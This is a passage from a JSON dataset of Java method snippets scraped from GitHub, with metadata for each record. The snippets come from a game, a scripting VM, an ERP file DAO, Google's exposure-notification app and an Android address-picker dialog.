["ShipDesign"], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float basePower(ShipDesign d) {\n        switch(d.size()) {\n            case ShipDesign.SMALL  : return 5*ranking();\n            case ShipDesign.MEDIUM : return 5  + (15*ranking());\n            case ShipDesign.LARGE  : return 30 + (30*ranking());\n            case ShipDesign.HUGE   : return 125 + (125*ranking());\n        }\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechDeflectorShield.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56404, "method_name": "setJump", "class_name": "JumpStatement", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setJump( int jump )\n\t{\n\t\tint oldpos = code.getPointerPosition();\n\t\tcode.seek(jumpPos);\n\t\tcode.writeInt(jump);\n\t\tcode.seek(oldpos);\n\t}", "url": "https://raw.githubusercontent.com/geertvos/gs-lang/master/src/main/java/net/geertvos/gvm/ast/JumpStatement.java", "stars": "17", "class_props": {"extends": "Statement", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56405, "method_name": "compile", "class_name": "JumpStatement", "params": ["GScriptCompiler"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void compile(GScriptCompiler c) {\n\t\tsuper.compile(c);\n\t\tc.code.write(GVM.JMP);\n\t\tjumpPos = c.code.size();\n\t\tc.code.writeInt(-1);\n\t\tthis.code = c.code;\n\t}", "url": "https://raw.githubusercontent.com/geertvos/gs-lang/master/src/main/java/net/geertvos/gvm/ast/JumpStatement.java", "stars": "17", "class_props": {"extends": "Statement", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 56406, "method_name": "getValidationResult", "class_name": "HyperWorldValidationException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "HyperWorldCreator", "snippet": "    @NotNull public HyperWorldCreator.ValidationResult getValidationResult() {\n        return this.validationResult;\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/exception/HyperWorldValidationException.java", "stars": "25", "class_props": {"extends": "HyperException", "implements": null, "modifiers": ["public"]}}, {"id": 56407, "method_name": "onLayout", "class_name": "ShellPageContainer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellPageContainer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56408, "method_name": "n_onLayout", "class_name": "ShellPageContainer", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellPageContainer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56409, "method_name": "monodroidAddReference", "class_name": "ShellPageContainer", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellPageContainer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56410, "method_name": "monodroidClearReferences", "class_name": "ShellPageContainer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellPageContainer.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56411, "method_name": "getFromRs", "class_name": "FileDataDAO", "params": ["ResultSet", "String", "boolean"], "throws": ["BGException"], "modifiers": ["public", "static"], "return_type": "FileData", "snippet": "    public static FileData getFromRs(ResultSet rs, String prefix, boolean loadAdditionalParameters) throws BGException {\n        FileData result = new FileData();\n\n        try {\n            result.setId(rs.getInt(prefix + \"id\"));\n            result.setTitle(rs.getString(prefix + \"title\"));\n            result.setTime(TimeUtils.convertTimestampToDate(rs.getTimestamp(prefix + \"time\")));\n            result.setSecret(rs.getString(\"secret\"));\n\n            if (loadAdditionalParameters) {\n                int userId = rs.getInt(\"user_id\");\n                if (userId > 0)\n                    result.setUser(UserCache.getUser(userId));\n\n                result.setComment(rs.getString(\"comment\"));\n                result.setVersion(rs.getInt(\"version\"));\n            }\n        } catch (SQLException exp) {\n            throw new BGMessageException(exp.getMessage());\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/FileDataDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56412, "method_name": "checkDir", "class_name": "FileDataDAO", "params": [], "throws": ["BGException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkDir() throws BGException {\n        if (!storeDir.exists() || !storeDir.isDirectory()) {\n            throw new BGException(\"\u041d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043a\u0430\u0442\u0430\u043b\u043e\u0433 \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u043e\u0432.\");\n        }\n        if (!storeDir.canRead() || !storeDir.canWrite()) {\n            throw new BGException(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a \u043a\u0430\u0442\u0430\u043b\u043e\u0433\u0443 \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u043e\u0432.\");\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/FileDataDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56413, "method_name": "add", "class_name": "FileDataDAO", "params": ["FileData"], "throws": ["BGException", "FileNotFoundException"], "modifiers": ["public"], "return_type": "FileOutputStream", "snippet": "    public FileOutputStream add(FileData file) throws BGException, FileNotFoundException {\n        checkDir();\n\n        file.setSecret(Utils.getDigest(String.valueOf(new Random().nextDouble())));\n\n        try {\n            String query = \"INSERT INTO \" + TABLE_FILE_DATE + \" (title, time, secret) VALUES (?, NOW(), ?)\";\n            PreparedStatement ps = con.prepareStatement(query, PreparedStatement.RETURN_GENERATED_KEYS);\n            ps.setString(1, file.getTitle());\n            ps.setString(2, file.getSecret());\n            ps.executeUpdate();\n\n            file.setId(lastInsertId(ps));\n\n            ps.close();\n        } catch (SQLException e) {\n            throw new BGException(e);\n        }\n\n        var outputStream = new FileOutputStream(getFile(file));\n        file.setOutputStream(outputStream);\n\n        return outputStream;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/FileDataDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56414, "method_name": "delete", "class_name": "FileDataDAO", "params": ["FileData"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void delete(FileData fileData) throws BGException {\n        try {\n            checkDir();\n\n            String query = \"DELETE FROM \" + TABLE_FILE_DATE + \" WHERE id=? AND secret=?\";\n            PreparedStatement ps = con.prepareStatement(query);\n            ps.setInt(1, fileData.getId());\n            ps.setString(2, fileData.getSecret());\n            ps.executeUpdate();\n            ps.close();\n\n            File file = getFile(fileData);\n            file.delete();\n        } catch (SQLException e) {\n            throw new BGException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/FileDataDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56415, "method_name": "getFile", "class_name": "FileDataDAO", "params": ["FileData"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getFile(FileData fileData) {\n        return new File(storeDir.getAbsolutePath() + \"/\" + nameFormatPattern.format(fileData.getId()) + \"_\" + fileData.getSecret());\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/FileDataDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56416, "method_name": "getFile", "class_name": "FileDataDAO", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getFile(String url) {\n        return new File(storeDir.getAbsolutePath() + \"/\" + url);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/dao/FileDataDAO.java", "stars": "12", "class_props": {"extends": "CommonDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56417, "method_name": "createReference", "class_name": "WeakMemoryCache", "params": ["Bitmap"], "throws": null, "modifiers": ["protected"], "return_type": "Reference<Bitmap>", "snippet": "\tprotected Reference<Bitmap> createReference(Bitmap value) {\n\t\treturn new WeakReference<Bitmap>(value);\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/cache/memory/impl/WeakMemoryCache.java", "stars": "74", "class_props": {"extends": "BaseMemoryCache", "implements": null, "modifiers": ["public"]}}, {"id": 56418, "method_name": "getAllExposureEntityLiveData", "class_name": "ExposureViewModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LiveData<List>", "snippet": "  public LiveData<List<ExposureEntity>> getAllExposureEntityLiveData() {\n    return repository.getAllExposureEntityLiveData();\n  }", "url": "https://raw.githubusercontent.com/google/exposure-notifications-android/master/storage/src/main/java/com/google/android/apps/exposurenotification/storage/ExposureViewModel.java", "stars": "205", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 56419, "method_name": "upsertExposureEntitiesAsync", "class_name": "ExposureViewModel", "params": ["List<ExposureEntity>"], "throws": null, "modifiers": ["public"], "return_type": "ListenableFuture<Void>", "snippet": "  public ListenableFuture<Void> upsertExposureEntitiesAsync(List<ExposureEntity> entities) {\n    return repository.upsertExposureEntitiesAsync(entities);\n  }", "url": "https://raw.githubusercontent.com/google/exposure-notifications-android/master/storage/src/main/java/com/google/android/apps/exposurenotification/storage/ExposureViewModel.java", "stars": "205", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 56420, "method_name": "deleteAllExposureEntitiesAsync", "class_name": "ExposureViewModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ListenableFuture<Void>", "snippet": "  public ListenableFuture<Void> deleteAllExposureEntitiesAsync() {\n    return repository.deleteAllExposureEntitiesAsync();\n  }", "url": "https://raw.githubusercontent.com/google/exposure-notifications-android/master/storage/src/main/java/com/google/android/apps/exposurenotification/storage/ExposureViewModel.java", "stars": "205", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 56421, "method_name": "getCount", "class_name": "MyAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return data.size();\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/MyAdapter.java", "stars": "1", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56422, "method_name": "getItem", "class_name": "MyAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getItem(int position) {\n        return position;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/MyAdapter.java", "stars": "1", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56423, "method_name": "getItemId", "class_name": "MyAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getItemId(int position) {\n        return position;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/MyAdapter.java", "stars": "1", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56424, "method_name": "getView", "class_name": "MyAdapter", "params": ["int", "View", "ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getView(int position, View convertView, ViewGroup parent) {\n        View vi=convertView;\n        if(convertView==null)\n            vi = inflater.inflate(R.layout.list_row, null);\n\n        TextView title = (TextView)vi.findViewById(R.id.sender); // title\n        TextView artist = (TextView)vi.findViewById(R.id.receiver); // artist name\n        TextView duration = (TextView)vi.findViewById(R.id.amount); // duration\n\n        HashMap<String, String> transaction = new HashMap<String, String>();\n        transaction = data.get(position);\n\n        // Setting all values in listview\n        title.setText(transaction.get(TransactionsFragment.KEY_SENDER));\n        artist.setText(transaction.get(TransactionsFragment.KEY_RECEIVER));\n        duration.setText(transaction.get(TransactionsFragment.KEY_AMOUNT));\n        return vi;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/MyAdapter.java", "stars": "1", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56425, "method_name": "setTitle", "class_name": "Builder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setTitle(@StringRes int id) {\n            return setTitle(getString(id));\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56426, "method_name": "setTitle", "class_name": "Builder", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setTitle(CharSequence text) {\n            mTitleView.setText(text);\n            return this;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56427, "method_name": "setProvince", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setProvince(String province) {\n            if (province != null && !\"\".equals(province)) {\n                List<AddressBean> data = mAdapter.getItem(0);\n                if (data != null && !data.isEmpty()) {\n                    for (int i = 0; i < data.size(); i++) {\n                        if (province.equals(data.get(i).getName())) {\n                            onSelected(0, i);\n                            break;\n                        }\n                    }\n                }\n            }\n            return this;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56428, "method_name": "setCity", "class_name": "Builder", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setCity(String city) {\n            if (mIgnoreArea) {\n                // \u5df2\u7ecf\u5ffd\u7565\u4e86\u53bf\u7ea7\u533a\u57df\u7684\u9009\u62e9\uff0c\u4e0d\u80fd\u9009\u5b9a\u6307\u5b9a\u7684\u57ce\u5e02\n                throw new IllegalStateException(\"The selection of county-level regions has been ignored. The designated city cannot be selected\");\n            }\n            if (city != null && !\"\".equals(city)) {\n                List<AddressBean> data = mAdapter.getItem(1);\n                if (data != null && !data.isEmpty()) {\n                    for (int i = 0; i < data.size(); i++) {\n                        if (city.equals(data.get(i).getName())) {\n                            // \u907f\u5f00\u76f4\u8f96\u5e02\uff0c\u56e0\u4e3a\u9009\u62e9\u7701\u7684\u65f6\u5019\u5df2\u7ecf\u81ea\u52a8\u8df3\u8fc7\u5e02\u533a\u4e86\n                            if (mAdapter.getItem(1).size() > 1) {\n                                onSelected(1, i);\n                            }\n                            break;\n                        }\n                    }\n                }\n            }\n            return this;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56429, "method_name": "setIgnoreArea", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setIgnoreArea() {\n            List<AddressBean> data = mAdapter.getItem(1);\n            if (data != null && !data.isEmpty()) {\n                // \u5df2\u7ecf\u6307\u5b9a\u4e86\u57ce\u5e02\uff0c\u4e0d\u80fd\u518d\u5ffd\u7565\u53bf\u7ea7\u533a\u57df\n                throw new IllegalStateException(\"Cities have been designated and county-level areas can no longer be ignored\");\n            }\n            mIgnoreArea = true;\n            return this;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56430, "method_name": "setListener", "class_name": "Builder", "params": ["OnListener"], "throws": null, "modifiers": ["public"], "return_type": "Builder", "snippet": "        public Builder setListener(OnListener listener) {\n            mListener = listener;\n            return this;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56431, "method_name": "onSelected", "class_name": "Builder", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onSelected(int recyclerViewPosition, int clickItemPosition) {\n            switch (recyclerViewPosition) {\n                case 0:\n                    // \u8bb0\u5f55\u5f53\u524d\u9009\u62e9\u7684\u7701\u4efd\n                    mProvince = mAdapter.getItem(recyclerViewPosition).get(clickItemPosition).getName();\n                    mTabLayout.getTabAt(mTabLayout.getSelectedTabPosition()).setText(mProvince);\n\n                    mTabLayout.addTab(mTabLayout.newTab().setText(getString(R.string.address_hint)), true);\n                    mAdapter.addItem(AddressManager.getCityList(mAdapter.getItem(recyclerViewPosition).get(clickItemPosition).getNext()));\n                    mViewPager.setCurrentItem(recyclerViewPosition + 1);\n\n                    // \u5982\u679c\u5f53\u524d\u9009\u62e9\u7684\u662f\u76f4\u8f96\u5e02\uff0c\u5c31\u76f4\u63a5\u8df3\u8fc7\u9009\u62e9\u57ce\u5e02\uff0c\u76f4\u63a5\u9009\u62e9\u533a\u57df\n                    if (mAdapter.getItem(recyclerViewPosition + 1).size() == 1) {\n                        onSelected(recyclerViewPosition + 1, 0);\n                    }\n                    break;\n                case 1:\n                    // \u8bb0\u5f55\u5f53\u524d\u9009\u62e9\u7684\u57ce\u5e02\n                    mCity = mAdapter.getItem(recyclerViewPosition).get(clickItemPosition).getName();\n                    mTabLayout.getTabAt(mTabLayout.getSelectedTabPosition()).setText(mCity);\n\n                    if (mIgnoreArea) {\n\n                        if (mListener != null) {\n                            mListener.onSelected(getDialog(), mProvince, mCity, mArea);\n                        }\n\n                        // \u5ef6\u8fdf\u5173\u95ed\n                        postDelayed(this::dismiss, 300);\n\n                    } else {\n                        mTabLayout.addTab(mTabLayout.newTab().setText(getString(R.string.address_hint)), true);\n                        mAdapter.addItem(AddressManager.getAreaList(mAdapter.getItem(recyclerViewPosition).get(clickItemPosition).getNext()));\n                        mViewPager.setCurrentItem(recyclerViewPosition + 1);\n                    }\n\n                    break;\n                case 2:\n                    // \u8bb0\u5f55\u5f53\u524d\u9009\u62e9\u7684\u533a\u57df\n                    mArea = mAdapter.getItem(recyclerViewPosition).get(clickItemPosition).getName();\n                    mTabLayout.getTabAt(mTabLayout.getSelectedTabPosition()).setText(mArea);\n\n                    if (mListener != null) {\n                        mListener.onSelected(getDialog(), mProvince, mCity, mArea);\n                    }\n\n                    // \u5ef6\u8fdf\u5173\u95ed\n                    postDelayed(this::dismiss, 300);\n                    break;\n                default:\n                    break;\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56432, "method_name": "run", "class_name": "Builder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void run() {\n            if (isShowing()) {\n                dismiss();\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56433, "method_name": "onClick", "class_name": "Builder", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View v) {\n            if (v == mCloseView) {\n                dismiss();\n                if (mListener != null) {\n                    mListener.onCancel(getDialog());\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56434, "method_name": "onTabSelected", "class_name": "Builder", "params": ["TabLayout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onTabSelected(TabLayout.Tab tab) {\n            synchronized (this) {\n                if (mViewPager.getCurrentItem() != tab.getPosition()) {\n                    mViewPager.setCurrentItem(tab.getPosition());\n                }\n\n                tab.setText(getString(R.string.address_hint));\n                switch (tab.getPosition()) {\n                    case 0:\n                        mProvince = mCity = mArea = null;\n                        if (mTabLayout.getTabAt(2) != null) {\n                            mTabLayout.removeTabAt(2);\n                            mAdapter.removeItem(2);\n                        }\n                        if (mTabLayout.getTabAt(1) != null) {\n                            mTabLayout.removeTabAt(1);\n                            mAdapter.removeItem(1);\n                        }\n                        break;\n                    case 1:\n                        mCity = mArea = null;\n                        if (mTabLayout.getTabAt(2) != null) {\n                            mTabLayout.removeTabAt(2);\n                            mAdapter.removeItem(2);\n                        }\n                        break;\n                    case 2:\n                        mArea = null;\n                        break;\n                    default:\n                        break;\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56435, "method_name": "onTabUnselected", "class_name": "Builder", "params": ["TabLayout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onTabUnselected(TabLayout.Tab tab) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56436, "method_name": "onTabReselected", "class_name": "Builder", "params": ["TabLayout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onTabReselected(TabLayout.Tab tab) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56437, "method_name": "onShow", "class_name": "Builder", "params": ["BaseDialog"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onShow(BaseDialog dialog) {\n            // \u6ce8\u518c ViewPager \u6ed1\u52a8\u76d1\u542c\n            mViewPager.registerOnPageChangeCallback(mCallback);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56438, "method_name": "onDismiss", "class_name": "Builder", "params": ["BaseDialog"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onDismiss(BaseDialog dialog) {\n            // \u53cd\u6ce8\u518c ViewPager \u6ed1\u52a8\u76d1\u542c\n            mViewPager.unregisterOnPageChangeCallback(mCallback);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "BaseDialog", "implements": ["TabLayout", "Runnable", "RecyclerViewAdapter", "BaseDialog", "BaseDialog"], "modifiers": ["final", "public", "static"]}}, {"id": 56439, "method_name": "onCreateViewHolder", "class_name": "RecyclerViewAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n            return new ViewHolder();\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "MyAdapter", "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56440, "method_name": "setOnSelectListener", "class_name": "RecyclerViewAdapter", "params": ["OnSelectListener"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void setOnSelectListener(OnSelectListener listener) {\n            mListener = listener;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "MyAdapter", "implements": null, "modifiers": ["final", "static", "private"]}}, {"id": 56441, "method_name": "onBindView", "class_name": "ViewHolder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void onBindView(int position) {\n                mAdapter.setData(getItem(position));\n            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "MyAdapter", "implements": ["OnItemClickListener"], "modifiers": ["final"]}}, {"id": 56442, "method_name": "onItemClick", "class_name": "ViewHolder", "params": ["RecyclerView", "View", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void onItemClick(RecyclerView recyclerView, View itemView, int position) {\n                if (mListener != null) {\n                    mListener.onSelected(getViewHolderPosition(), position);\n                }\n            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/dialog/AddressDialog.java", "stars": "1", "class_props": {"extends": "MyAdapter", "implements": ["OnItemClickListener"], "modifiers": ["final"]}}, {"id": 56443, "method_name": "onCreateViewHolder", "class_name": "AddressAdapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "ViewHolder", "snippet": "        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int position) {\n            TextView textView = new TextView(parent.getContext());\n            textView.setGravity(Gravity.CENTER_VERTICAL);\n            textView.setBackgroundResource(R.drawable.selector_transparent);\n            textView.setTextColor(0xFF222222);\n            textView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);\n            textView.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));\n            textView.setPadding((int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 20, getResources().getDisplayMetrics()),\n                    (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 10, getResources().getDisplayMetrics()),\n                    (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 20, getResources().getDisplayMetrics()),\n                    (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 10, getResources().getDisplayMetrics()));\n            return new 